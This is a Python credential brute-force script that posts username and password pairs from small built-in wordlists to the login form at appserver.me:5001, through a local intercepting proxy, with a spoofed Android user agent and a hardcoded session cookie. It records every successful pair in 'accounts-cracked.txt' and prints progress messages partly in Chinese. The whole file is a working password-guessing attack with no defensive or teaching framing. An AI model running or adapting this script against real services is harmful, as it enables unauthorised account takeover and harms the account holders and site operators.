#!/usr/bin/python
# -*- coding: UTF-8 -*-
import requests
import time

outFile = open('accounts-cracked.txt', 'w')
def brute_force(user, password):
    domain = "appserver.me:5001"
    #domain = "appserver.me:80"
    name = user.strip()
    passwd = password.strip()
    proxy = {"http":"127.0.0.1:8080"}
    url = "http://"+domain+"/login/"
    CT = "application/x-www-form-urlencoded"
    user_agent = "MacOS; Python3.6; requests)"
    user_agent = "Dalvik/2.1.0 (Linux; U; Android 8.1.1; Redmi 8 MIUI/8.4.26)"
    AE = "gzip, deflate"
    appcookie = "Bq9cFuKPRCG0btZxxECbvjMLJmQn1MsX8FPu46iRUdRcJMoihUj7LUJXerp5DrA-1A4uStmXeHqzigxrYAu6Z94fWqig2s8RWEgF5E9mRkAKDQG93HELqh1qIught4dH3Fx6tqjfc7EspkAkuoIkTjHHMXl-FkM6aso7BoKTg2uwRFlrbOEzL5M8gvjlPMgBBSYp3PsGO-5J7n6bZCNueapd1K5wpjRn5Pqa74PK6Af-gJ62HM_nxG0_6mwaXwuuqU9XmSKgOzjLdiJDH9C-1ivHS69W3a0btBP727vZlX1HRTB4O94ivkYeJlnJHDit1lZfQ6OJfl9k8u_V5KkThISQSOG..MXJfQ1hQjLhgYoRzF_k56qnOtbJeaC1YTE9KHD_aAJbLIvnJ9BWB5bNhkYX0G7GT6T1IA4EjAXHmLIVzOa1hQsubw_EaKQOc80Pelln0gsfs538HvwAzaFFC9zO8Rul-lkwuZkIx06fMcXOjWv2_jpoiTQUczAFBwolR-Ch316mQiqcEt_UBHr_CVtfJB7cyRN-0ISeoI_mtlemGPJHPBq0uAnV2STrL_xKIpeA_NVJ84zV5r_0jNI_c0UKEWT0ixQUwNKaEIpT0YNneWEupM-lYg-__wO22_tADPiuibfN_XmXSUkc-HNKktHAKdtyx0RojEBIDoLps-P5nA9XjQH321d9uft5dvolnv0TS0XCN0MVUtSTmhIfXI6CyB_b7H8MYikwh3potJwzQrNJ-fUHFB2iLrMzrLtJk8o1LzPv9dOO-X2OHRaYM40vn7G8WOOqKIOrnLI247XmaHTLIfzB75styqtZ3Je1Bgw1IEmcuuZdpnAYgKoxLTm4d3oHevaqDb2hLaqz7GgHDUWG482tsDY9KIoWJLI_r-7PVmIQbOZWJaC0d65wQpN4JJRe-if4jD3lI1bY7KOAGjw-kKacrxTxGpZ9FyyNn1nY1oigIDrtPRLG7vSsbrkwRKkHzavtM2x_7CuatBZMfVyDdQbcYV88sRg1qi_ZMDKhOWUPinzGhn3wS45xLs6fX2rVF5S4-c3BVFz0UZR0zts82_4TQ_GfXEvJDfTuX5202yNeaI0ou7uUlQFIaS2uifLjL-NMVq1ldB20qO8uEtE3HiN1oT2GPwGS_WOirP7MFmatxMoKXW9D2wsAhG7zec5P5nUETL-CD3XGqEK-b-3BUCiaJapXREmH482crnY5oV8alNX0aUYa08unf-l379DA2_ZJUAbnUBkMObMlnNt05NDymJBgZzZkQVGHrkdmG54SeNhRF0UZp4GmAair0vgB7JapyQ2hjXzOG..R56793S9"
    header = {"Content-Type":CT,"User-Agent":user_agent,"Accept-Encoding":AE}
    header_appcookie = dict({"wfaCdxkF":appcookie}, **header)
    #print(header_appcookie)
    data = name + '&' + passwd
    data = "uid=" + name + '&' + "passw=" + passwd
    #print("try data:",data)
    response = requests.post(url,headers=header_appcookie,data=data,allow_redirects=False,proxies=proxy)
    code = response.headers.get('Location')
    #print(name,passwd)
    #print(response.text)
    if "age" in response.text:
        print("try data:",data,"状态码:" ,response.status_code, '+++++ find user:', name, ' with password:',passwd, '+++++')
        outFile.write(name + ':' + passwd+'\n' )
    else:
        #print('----- error user:', name, ' with password:',passwd, '-----')
        print("try data:",data,"状态码:" ,response.status_code, '----- ', name, ' 失败', '-----')
        pass
    return
    

if __name__ == '__main__':
    '''
    with open('user.txt', 'r') as userline:
        y = userline.readlines()
        with open('pass.txt', 'r') as passline:
            b= passline.readlines()
            for u in y:
                for p in b:
                    brute_force(user=u,password=p)
    '''
    zidian_u = ["admin", "qiqi", "feifei", "liyi", "haha", "zhangdm", "limumu", "limu"]
    zidian_p = ["passwdd", "123456", "000000", "666666"]
    for u in zidian_u:
        for p in zidian_p:
            brute_force(user=u,password=p)
            time.sleep(0.3)

outFile.close()
with open('accounts-cracked.txt','r') as text:
    list = text.readlines()
    sum=len(list)

if sum>0:
    print(u"找到%r个账号密码" %sum)

else:
    print(u"找到0个账号密码")


